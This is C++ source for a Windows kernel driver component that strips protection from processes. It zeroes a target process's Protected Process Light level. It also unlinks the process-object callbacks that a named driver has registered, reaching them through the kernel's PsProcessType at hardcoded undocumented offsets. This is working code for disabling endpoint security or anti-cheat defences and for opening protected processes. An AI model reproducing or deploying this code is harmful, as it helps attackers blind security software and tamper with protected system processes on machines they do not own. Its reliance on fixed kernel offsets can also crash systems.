
#include <ntifs.h>

#include "RemoveProtections.h"
#include "ProcessUtils.h"
#include "Vector.h"
#include "ModuleFinder.h"
#include "PushLock.h"
#include "AutoLock.h"
#include "Macros.h"



namespace Protections {

	NTSTATUS GetProtectingCallbacks(Vector<CallbackEntry*>& RelevantCallbacks, const CHAR* DriverImageName);

	NTSTATUS RemovePsProtection(PEPROCESS TargetProcess, Ppl::ProcessProtectionPolicy& PrevProtection) {
		__try {
			Ppl::GetProcessProtection(TargetProcess, &PrevProtection);

			// turn off protection
			Ppl::ProcessProtectionPolicy newProtection = { 0 };
			Ppl::ModifyProcessProtectionPolicy(TargetProcess, newProtection);
			return STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			auto status = ::GetExceptionCode();
			LOG_FAIL_WITH_STATUS(STRINGIFY(Protections::RemovePsProtection) " Failed", status);
			return status;
		}
	}

	NTSTATUS RemoveProtectingObjectCallbacks(const CHAR* DriverImageName) {
		__try {
			Vector<CallbackEntry*> relevantCallbacks;
			auto status = GetProtectingCallbacks(relevantCallbacks, DriverImageName);
			RETURN_IF_FAILED(status);
			auto* typeLock = reinterpret_cast<PEX_PUSH_LOCK>(reinterpret_cast<UCHAR*>(*PsProcessType) + OBJECT_TYPE_LOCK_OFFSET);
			{
				// modify callback list
				
				PushLock pushLock = { typeLock, true };
				AutoLock<PushLock> autoLock(pushLock);

				for (auto callback : relevantCallbacks) {
					::RemoveEntryList(&callback->Entry);
				}
			}
			return STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			auto status = ::GetExceptionCode();
			LOG_FAIL_WITH_STATUS(STRINGIFY(Protections::RemoveProtectingObjectCallbacks) " Failed", status);
			return status;
		}
	}

	/*
		Returns all callbacks that are registered in a specific driver.
	*/
	NTSTATUS GetProtectingCallbacks(Vector<CallbackEntry*>& RelevantCallbacks, const CHAR* DriverImageName) {
		auto* processObjectType = *PsProcessType;
		auto** callbackList = reinterpret_cast<CallbackEntry**>(reinterpret_cast<UCHAR*>(processObjectType) + OBJECT_CALLBACK_LIST_OFFSET);
		__try {
			ModuleFinder finder;

			for (auto* callback = *callbackList;
				callback != reinterpret_cast<const CallbackEntry*>(callbackList);
				callback = CONTAINING_RECORD(callback->Entry.Flink, CallbackEntry, Entry))
			{
				if (!callback->IsEnabled) {
					continue;
				}
				const auto* containingModule = finder.FindModuleByAddress(reinterpret_cast<PVOID>(callback->PreOperationFunction));
				if (containingModule == nullptr) {
					LOG_FAIL_VA("Found callback %llx, unknown module, refreshing module list and trying again", callback->PreOperationFunction);

					finder.Refresh();
					containingModule = finder.FindModuleByAddress(reinterpret_cast<PVOID>(callback->PreOperationFunction));
					if (containingModule == nullptr) {
						LOG_FAIL("Module not found, continuing...");
						continue;
					}
				}

				LOG_SUCCESS_VA("Found callback %llx in module %s", callback->PreOperationFunction, containingModule->FullPathName);
				// insert relevant callbacks
				if (!::strcmp(reinterpret_cast<const CHAR*>(containingModule->FullPathName) + containingModule->FileNameOffset, DriverImageName)) {
					RelevantCallbacks.Insert(callback);
				}
			}
			return STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			auto status = ::GetExceptionCode();
			LOG_FAIL_WITH_STATUS(STRINGIFY(Protections::GetProtectingCallbacks) " Failed", status);
			return status;
		}
	}
}
